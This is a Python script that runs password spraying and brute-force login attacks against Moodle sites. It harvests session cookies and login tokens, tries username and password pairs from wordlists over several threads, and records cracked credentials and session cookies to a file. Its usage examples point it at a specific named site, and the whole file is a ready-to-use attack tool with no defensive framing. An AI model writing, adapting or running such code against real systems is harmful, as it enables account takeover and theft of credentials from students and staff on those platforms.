#!/usr/bin/env python3
import requests
import re
import sys
import time
import threading
import queue
from typing import Optional, Tuple, List
from concurrent.futures import ThreadPoolExecutor, as_completed

class MoodleSprayer:
    def __init__(self, base_url: str, users_file: str, passwords_file: str, max_workers: int = 3):
        self.base_url = base_url.rstrip('/')
        self.users_file = users_file
        self.passwords_file = passwords_file
        self.max_workers = max_workers
        self.found_credentials = []
        self.lock = threading.Lock()
        self.stats = {
            'attempts': 0,
            'success': 0,
            'failures': 0,
            'token_failures': 0
        }

    def get_tokens(self) -> Tuple[Optional[str], Optional[str]]:
        """Get MoodleSession cookie and logintoken from login page."""
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Origin': self.base_url,
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i',
                'Te': 'trailers',
                'Connection': 'keep-alive'
            })

            response = session.get(
                f"{self.base_url}/login/index.php",
                allow_redirects=False,
                timeout=10
            )

            # Extract MoodleSession
            moodle_session = None
            if 'Set-Cookie' in response.headers:
                set_cookie = response.headers.get('Set-Cookie', '')
                match = re.search(r'MoodleSession=([^;]+)', set_cookie)
                if match:
                    moodle_session = match.group(1)

            # Extract logintoken
            logintoken = None
            if response.text:
                match = re.search(r'name="logintoken" value="([^"]+)"', response.text)
                if match:
                    logintoken = match.group(1)
                else:
                    # Try alternative pattern
                    match = re.search(r'logintoken["\']?\s*value=["\']([^"\']+)["\']', response.text, re.I)
                    if match:
                        logintoken = match.group(1)

            return moodle_session, logintoken, session

        except Exception as e:
            return None, None, None

    def attempt_login(self, username: str, password: str, logintoken: str, moodle_session: str) -> Tuple[bool, Optional[str]]:
        """Attempt login with given credentials."""
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Origin': self.base_url,
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i',
                'Te': 'trailers',
                'Connection': 'keep-alive'
            })

            # Set the MoodleSession cookie
            session.cookies.set('MoodleSession', moodle_session)

            # Prepare POST data
            data = {
                'anchor': '',
                'logintoken': logintoken,
                'username': username,
                'password': password
            }

            headers = {
                'Referer': f"{self.base_url}/login/index.php",
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.base_url
            }

            response = session.post(
                f"{self.base_url}/login/index.php",
                data=data,
                headers=headers,
                allow_redirects=False,
                timeout=10
            )

            # Check for MOODLEID1_
            success = False
            new_moodle_session = None

            if 'Set-Cookie' in response.headers:
                set_cookie = response.headers.get('Set-Cookie', '')
                if 'MOODLEID1_' in set_cookie.upper():
                    success = True

                # Extract new MoodleSession
                match = re.search(r'MoodleSession=([^;]+)', set_cookie)
                if match:
                    new_moodle_session = match.group(1)

            return success, new_moodle_session

        except Exception:
            return False, None

    def spray_worker(self, username: str, password: str):
        """Worker function for spraying a single username/password combination."""
        with self.lock:
            self.stats['attempts'] += 1

        # Get fresh tokens for each attempt
        moodle_session, logintoken, _ = self.get_tokens()

        if not moodle_session or not logintoken:
            with self.lock:
                self.stats['token_failures'] += 1
            print(f"  [Token fail] {username}:{password}")
            return

        # Attempt login
        success, new_session = self.attempt_login(username, password, logintoken, moodle_session)

        with self.lock:
            if success:
                self.stats['success'] += 1
                self.found_credentials.append((username, password, new_session))
                print(f"  [SUCCESS] {username}:{password}")
                if new_session:
                    print(f"     Session: {new_session}")
            else:
                self.stats['failures'] += 1
                print(f"  [FAILED] {username}:{password}")

    def run_spraying(self):
        """Run password spraying: try each password against all users."""
        try:
            # Read users
            with open(self.users_file, 'r', encoding='utf-8', errors='ignore') as f:
                users = [line.strip() for line in f if line.strip()]

            # Read passwords
            with open(self.passwords_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]

            if not users or not passwords:
                print("Error: Users or passwords file is empty!")
                return

            total_attempts = len(users) * len(passwords)
            print(f"Loaded {len(users)} users from {self.users_file}")
            print(f"Loaded {len(passwords)} passwords from {self.passwords_file}")
            print(f"Total combinations to try: {total_attempts}")
            print("-" * 60)

            # Create task queue
            tasks = []
            for password in passwords:
                for username in users:
                    tasks.append((username, password))

            # Execute with ThreadPoolExecutor
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = []
                for username, password in tasks:
                    future = executor.submit(self.spray_worker, username, password)
                    futures.append(future)
                    time.sleep(0.5)  # Rate limiting between task submissions

                # Wait for all tasks to complete
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        print(f"Task error: {e}")

            # Print summary
            print("\n" + "=" * 60)
            print("SPRAYING COMPLETED")
            print("=" * 60)
            print(f"Total attempts: {self.stats['attempts']}")
            print(f"Successful logins: {self.stats['success']}")
            print(f"Failed attempts: {self.stats['failures']}")
            print(f"Token failures: {self.stats['token_failures']}")

            if self.found_credentials:
                print(f"\nFOUND CREDENTIALS:")
                for username, password, session in self.found_credentials:
                    print(f"  {username}:{password}")
                    if session:
                        print(f"    Session: {session}")

                # Save to file
                with open('found_credentials.txt', 'w') as f:
                    for username, password, session in self.found_credentials:
                        f.write(f"Username: {username}\n")
                        f.write(f"Password: {password}\n")
                        if session:
                            f.write(f"Session: {session}\n")
                        f.write("-" * 40 + "\n")
                print(f"\nCredentials saved to 'found_credentials.txt'")

        except FileNotFoundError as e:
            print(f"Error: File not found - {e}")
        except Exception as e:
            print(f"Unexpected error: {e}")
            import traceback
            traceback.print_exc()

    def run_bruteforce(self):
        """Run traditional bruteforce: try all passwords for each user sequentially."""
        try:
            # Read users
            with open(self.users_file, 'r', encoding='utf-8', errors='ignore') as f:
                users = [line.strip() for line in f if line.strip()]

            # Read passwords
            with open(self.passwords_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]

            if not users or not passwords:
                print("Error: Users or passwords file is empty!")
                return

            print(f"Loaded {len(users)} users from {self.users_file}")
            print(f"Loaded {len(passwords)} passwords from {self.passwords_file}")
            print("-" * 60)

            for user_index, username in enumerate(users, 1):
                print(f"\n[User {user_index}/{len(users)}] Testing: {username}")
                print("-" * 40)

                for pass_index, password in enumerate(passwords, 1):
                    with self.lock:
                        self.stats['attempts'] += 1

                    # Get fresh tokens for each attempt
                    moodle_session, logintoken, _ = self.get_tokens()

                    if not moodle_session or not logintoken:
                        with self.lock:
                            self.stats['token_failures'] += 1
                        print(f"  Attempt {pass_index}: Failed to get tokens, skipping...")
                        time.sleep(2)
                        continue

                    print(f"  Attempt {pass_index}/{len(passwords)}: {password} ", end='', flush=True)

                    # Attempt login
                    success, new_session = self.attempt_login(username, password, logintoken, moodle_session)

                    with self.lock:
                        if success:
                            self.stats['success'] += 1
                            self.found_credentials.append((username, password, new_session))
                            print(f"[SUCCESS]")
                            print(f"  Password found for {username}: {password}")
                            if new_session:
                                print(f"  Session: {new_session}")
                            break  # Move to next user
                        else:
                            self.stats['failures'] += 1
                            print(f"[FAILED]")

                    time.sleep(1)  # Rate limiting

                time.sleep(2)  # Extra delay between users

            # Print summary
            print("\n" + "=" * 60)
            print("BRUTEFORCE COMPLETED")
            print("=" * 60)
            print(f"Total attempts: {self.stats['attempts']}")
            print(f"Successful logins: {self.stats['success']}")
            print(f"Failed attempts: {self.stats['failures']}")
            print(f"Token failures: {self.stats['token_failures']}")

            if self.found_credentials:
                print(f"\nFOUND CREDENTIALS:")
                for username, password, session in self.found_credentials:
                    print(f"  {username}:{password}")
                    if session:
                        print(f"    Session: {session}")

                # Save to file
                with open('found_credentials.txt', 'w') as f:
                    for username, password, session in self.found_credentials:
                        f.write(f"Username: {username}\n")
                        f.write(f"Password: {password}\n")
                        if session:
                            f.write(f"Session: {session}\n")
                        f.write("-" * 40 + "\n")
                print(f"\nCredentials saved to 'found_credentials.txt'")

        except FileNotFoundError as e:
            print(f"Error: File not found - {e}")
        except Exception as e:
            print(f"Unexpected error: {e}")
            import traceback
            traceback.print_exc()

def main():
    if len(sys.argv) not in [4, 5]:
        print("Usage: python3 moodle_spray.py <base_url> <users_file> <passwords_file> [mode]")
        print("Modes: 'spray' (default) or 'bruteforce'")
        print("Example: python3 moodle_spray.py https://globalsupport.education users.txt passwords.txt")
        print("Example: python3 moodle_spray.py https://globalsupport.education users.txt passwords.txt bruteforce")
        sys.exit(1)

    base_url = sys.argv[1]
    users_file = sys.argv[2]
    passwords_file = sys.argv[3]
    mode = sys.argv[4] if len(sys.argv) > 4 else 'spray'

    sprayer = MoodleSprayer(base_url, users_file, passwords_file, max_workers=3)

    if mode.lower() == 'bruteforce':
        print(f"Starting bruteforce mode...")
        sprayer.run_bruteforce()
    else:
        print(f"Starting spraying mode...")
        sprayer.run_spraying()

if __name__ == "__main__":
    main()
